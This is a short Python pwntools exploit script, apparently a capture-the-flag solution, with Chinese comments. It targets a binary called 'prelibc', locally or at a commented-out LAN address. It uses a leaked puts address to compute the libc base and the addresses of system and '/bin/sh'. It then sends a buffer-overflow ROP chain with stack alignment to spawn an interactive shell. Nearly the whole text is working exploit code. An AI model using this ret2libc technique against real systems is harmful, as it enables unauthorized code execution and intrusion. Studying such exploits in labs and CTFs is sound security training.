from pwn import *

context(arch='amd64', os='linux', log_level='debug')

p = process('./prelibc')

# p = remote('192.168.31.103',58626)

libc = ELF('./libc.so.6')
# 思路，它给了我们一个puts的地址，我们可以通过这个puts的地址来计算出libc的地址
# 通过libc的地址来计算出system的地址和"/bin/sh"的地址   
# 然后就可以调用system("/bin/sh")了

p.recvuntil('libc: ')
putsAddr=int(p.recvuntil(b'.')[:-1],16)
print(f"puts@libc: {hex(putsAddr)}")

# libc，system,binsh的地址
libcAddr = putsAddr - libc.sym['puts']
libc.address = libcAddr
systemAddr = libc.sym['system']
binshAddr = next(libc.search(b'/bin/sh\x00'))

# gdb.attach(p)

pop_rdi_ret = next(libc.search(asm("pop rdi; ret;")))
print(f"pop_rdi_ret: {hex(pop_rdi_ret)}")
test_ret = next(libc.search(asm("ret;")))

ret = pop_rdi_ret + 1   # 跳过rsp，对其栈
payload = cyclic(9) + flat([        # buf是1字节，填充9个字节是为了写完rbp，直到ret
    test_ret,        # 栈对齐， pop_rdi_ret才是真正的gadget，
    pop_rdi_ret,
    binshAddr,
    systemAddr
])

p.sendafter(b'>', payload)

p.interactive()
